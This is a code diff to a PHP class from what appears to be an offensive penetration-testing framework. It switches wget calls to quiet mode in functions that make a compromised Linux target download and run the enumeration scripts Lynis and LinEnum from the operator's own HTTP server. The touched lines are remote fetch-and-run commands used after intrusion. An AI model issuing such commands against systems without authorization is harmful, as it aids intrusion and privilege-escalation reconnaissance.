@@ -311,9 +311,9 @@ class check4linux8enum extends check4linux8protocol{
         $result .= $this->ssTitre(__FUNCTION__);
         
         if (!file_exists("$this->dir_tmp/lynis-master.tar.xz")) $this->requette("cp -v $this->dir_tools/lan/linux/lynis-master.tar.xz $this->dir_tmp/lynis-master.tar.xz ");
-        // $data = "wget https://github.com/CISOfy/lynis/archive/master.zip -O  /tmp/lynis.zip && unzip /tmp/lynis.zip -d /tmp/ && /tmp/lynis-master/lynis audit system  > /tmp/lynis-master/lynis.rst && cat /tmp/lynis-master/lynis.rst && rm -vr /tmp/lynis-master";
+        // $data = "wget https://github.com/CISOfy/lynis/archive/master.zip -qO  /tmp/lynis.zip && unzip /tmp/lynis.zip -d /tmp/ && /tmp/lynis-master/lynis audit system  > /tmp/lynis-master/lynis.rst && cat /tmp/lynis-master/lynis.rst && rm -vr /tmp/lynis-master";
         
-        $data = "wget http://".$this->ip4addr4target($this->ip).":$this->port_rfi/lynis-master.tar.xz -O  /tmp/lynis-master.tar.xz";
+        $data = "wget http://".$this->ip4addr4target($this->ip).":$this->port_rfi/lynis-master.tar.xz -qO  /tmp/lynis-master.tar.xz";
         $lines = trim($this->req_str($stream,$data,$this->stream_timeout,""));
         
         
@@ -362,8 +362,8 @@ class check4linux8enum extends check4linux8protocol{
     public function tools4linEnum($stream){
         $result = "";
         $result .= $this->ssTitre(__FUNCTION__);
-        if (!file_exists("$this->dir_tmp/LinEnum.sh")) $this->requette("wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O $this->dir_tmp/LinEnum.sh ");
-        $data = "wget http://".$this->ip4addr4target($this->ip).":$this->port_rfi/LinEnum.sh -O ./LinEnum.sh";
+        if (!file_exists("$this->dir_tmp/LinEnum.sh")) $this->requette("wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -qO $this->dir_tmp/LinEnum.sh ");
+        $data = "wget http://".$this->ip4addr4target($this->ip).":$this->port_rfi/LinEnum.sh -qO ./LinEnum.sh";
         $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "bash ./LinEnum.sh -t";
